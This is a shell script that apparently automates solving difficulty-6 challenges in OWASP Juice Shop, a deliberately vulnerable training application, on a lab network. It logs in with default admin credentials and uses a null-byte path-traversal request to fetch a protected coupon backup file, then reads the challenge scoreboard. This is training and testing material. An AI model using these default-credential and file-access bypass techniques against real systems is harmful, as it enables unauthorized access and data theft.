#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.77.180"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


# Initiate session and cookies
echo "6.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/6-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/6-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/6-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/6-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/6-cookies.txt

# Forge a coupon code that gives you a discount of at least 80%.
echo "6.1 - FORGED COUPONS"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/6-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/6-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/6-admin.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/6-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/6-cookies.txt $result_folder/6-admin-cookies.txt
curl -s -X GET "http://$target_ip/ftp/coupons_2013.md.bak%2500.md" -b "$result_folder/6-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/6-coupons_2013.md.bak


# Compute score
echo "6.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/6-cookies.txt" -L -o $result_folder/6-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 6 and .solved == true)] | length' $result_folder/6-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 6 and .solved != null)] | length' $result_folder/6-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"